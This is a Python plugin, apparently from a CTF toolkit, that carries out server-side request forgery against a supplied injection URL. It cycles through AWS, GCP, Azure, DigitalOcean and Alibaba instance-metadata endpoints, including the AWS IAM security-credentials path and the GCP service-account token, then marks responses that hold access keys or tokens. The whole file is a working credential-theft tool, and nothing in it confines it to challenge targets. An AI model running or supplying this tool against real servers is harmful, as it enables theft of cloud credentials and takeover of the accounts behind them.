"""Fetch cloud instance-metadata through an SSRF injection point.

Give a URL with the literal token ``FUZZ`` where the server-side fetch happens,
e.g. ``http://target/proxy?url=FUZZ``. The module substitutes known cloud
metadata endpoints and reports which return data — the classic SSRF-to-cloud
credential path in CTF/web challenges.
"""

from __future__ import annotations

import argparse

from rich.table import Table

from syctf.core.types import ExecutionContext
from syctf.flags.detector import FlagDetector
from syctf.utils.net_utils import http_get

# (label, metadata URL, optional headers)
_TARGETS: list[tuple[str, str, dict[str, str]]] = [
    ("AWS IMDSv1 root", "http://169.254.169.254/latest/meta-data/", {}),
    ("AWS IAM roles", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}),
    ("AWS user-data", "http://169.254.169.254/latest/user-data/", {}),
    ("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     {"Metadata-Flavor": "Google"}),
    ("Azure IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     {"Metadata": "true"}),
    ("DigitalOcean", "http://169.254.169.254/metadata/v1.json", {}),
    ("Alibaba", "http://100.100.100.200/latest/meta-data/", {}),
]


class ImdsSsrfPlugin:
    """Probe cloud metadata endpoints through an SSRF vector."""

    name = "imds-ssrf"
    description = "Fetch AWS/GCP/Azure/DO/Alibaba metadata via an SSRF injection URL (FUZZ)"

    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument("--url", required=True, help="SSRF URL containing FUZZ, e.g. http://t/proxy?url=FUZZ")
        parser.add_argument("--encode", action="store_true", help="URL-encode the metadata URL when substituting")

    def run(self, args: argparse.Namespace, context: ExecutionContext) -> int:
        template = str(args.url)
        if "FUZZ" not in template:
            context.console.print("[bold red]--url must contain the token FUZZ.[/bold red]")
            return 2

        from urllib.parse import quote

        timeout = max(6.0, float(getattr(context.config, "request_timeout", 8.0)))
        detector = FlagDetector(custom_format=context.cache.get("flag_format"))
        context.logger.info("cloud imds-ssrf url=%s", template)

        table = Table(title="SSRF metadata probe")
        table.add_column("Target", style="cyan", no_wrap=True)
        table.add_column("Status", style="white")
        table.add_column("Snippet", style="green")

        for label, meta_url, headers in _TARGETS:
            injected = template.replace("FUZZ", quote(meta_url, safe="") if args.encode else meta_url)
            response = http_get(injected, timeout=timeout, headers=headers or None)
            if response is None:
                table.add_row(label, "error", "")
                continue
            body = response.text or ""
            snippet = body.strip().replace("\n", " ")[:80]
            marker = "★" if any(k in body for k in ("AccessKeyId", "access_token", "SecretAccessKey", "compute")) else ""
            table.add_row(label, f"{response.status_code} {marker}", snippet)
            for hit in detector.scan(body):
                if hit.real:
                    context.console.print(f"[bold green]Flag:[/bold green] {hit.value}")
                    context.cache["flag"] = hit.value

        context.console.print(table)
        context.console.print("[dim]★ = response looks like real cloud credentials/metadata.[/dim]")
        return 0


plugin = ImdsSsrfPlugin()
